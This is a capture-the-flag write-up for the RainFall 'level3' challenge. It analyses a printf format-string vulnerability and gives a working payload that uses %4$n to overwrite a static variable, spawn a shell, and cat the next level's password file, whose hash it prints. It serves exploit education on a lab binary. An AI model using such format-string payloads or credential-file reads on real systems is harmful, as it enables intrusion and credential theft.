## Level 3

### Vulnerability Analysis
The target is `level3`. Examining the `main` function with `gdb` shows that it simply sets up the stack frame and calls a function named `v()`.

Checking the disassembly of `v()` reveals the following behavior:
1. It allocates a large buffer of 520 bytes (`sub esp, 0x218`).
2. It uses `fgets` to securely read up to `0x200` (512) bytes into the buffer at `ebp-0x208` from standard input (`stdin`). Because `fgets` asks for a maximum length, a standard Buffer Overflow is not possible here.
3. It passes our user-controlled buffer directly to `printf`:
   ```assembly
   0x080484cc <+40>:    lea    eax,[ebp-0x208]
   0x080484d2 <+46>:    mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
   ```
   This is a classic **Format String Vulnerability**. We can use format specifiers like `%x` and `%n` in our input to read from and write to arbitrary memory locations.
4. After printing the buffer, it compares the value stored at the static memory address `0x804988c` with `0x40` (64 in decimal):
   ```assembly
   0x080484da <+54>:    mov    eax,ds:0x804988c
   0x080484df <+59>:    cmp    eax,0x40
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   ```
5. If the value at `0x804988c` equals 64, it calls `system()` (which likely spawns a shell).

### The Exploit
Our goal is to use the Format String Vulnerability in the `printf(buffer)` call to overwrite the static variable at `0x804988c` with the value `64`.

First, we need to find the offset of our buffer in `printf`'s parameter footprint to target it. By inputting `AAAA` and printing stack values with `%x`, we can find where our input is located.
```bash
level3@RainFall:~$ ./level3 
AAAA %x %x %x %x %x %x %x %x %x %x %x %x
AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520 ...
```
We see `41414141` (`AAAA` in hex) appears at the 4th position. This means our format string parameter offset is `4`.

We will construct a payload that places the target address (`0x804988c`) at the beginning of the buffer. Because this address consumes 4 bytes, we need to print exactly 60 more bytes of padding to reach the required `64` total characters printed. 

We can then use the `%n` format specifier, pointed at our 4th parameter position (`%4$n`), to write the total count of characters printed (`64`) directly into the target address.

Payload: `[Target Address] + [60 bytes of padding] + [%4$n]`

```bash
level3@RainFall:~$ (python -c 'print "\x8c\x98\x04\x08" + "B"*60 + "%4$n"'; cat) | ./level3
BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB
Wait what?!
whoami
level4
cat /home/user/level4/.pass
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```